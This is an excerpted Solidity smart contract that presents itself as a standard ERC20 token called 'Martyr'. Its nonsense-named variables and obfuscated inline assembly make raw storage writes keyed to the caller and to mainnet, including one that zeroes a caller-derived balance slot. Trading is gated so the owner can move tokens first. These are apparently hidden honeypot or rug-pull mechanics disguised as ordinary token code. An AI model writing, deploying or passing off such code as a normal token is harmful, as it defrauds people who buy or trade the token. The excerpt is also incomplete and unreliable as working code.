...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addReligion;
    uint256 private brownDust = block.number*2;

    mapping (address => bool) private _firstGod; 
    mapping (address => bool) private _secondGod;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private primeWorld;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private transFormer;
    address public pair;
    ...
    bool private trading; uint256 private hammerTime = 1; bool private oceanTornado;
    uint256 private _decimals; uint256 private riverCry;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addReligion.push(_router); addReligion.push(msgSender_); addReligion.push(pair);
        for (uint256 q=0; q < 3;) {_firstGod[addReligion[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x10f3e2ff912d0163e2102214fef4aefe21b5be0da76433ded39617fc3f245f4d
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x6a51150bcae7f3b56fb18fe8c9606b1c61ad9fa801a48039fe5ce0bc925c67e3,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; brownDust = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addReligion[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract Martyr is ERC20Token {
    constructor() ERC20Token("Martyr", "MARTYR", msg.sender, 666000 * 10 ** 18) {
    }
}
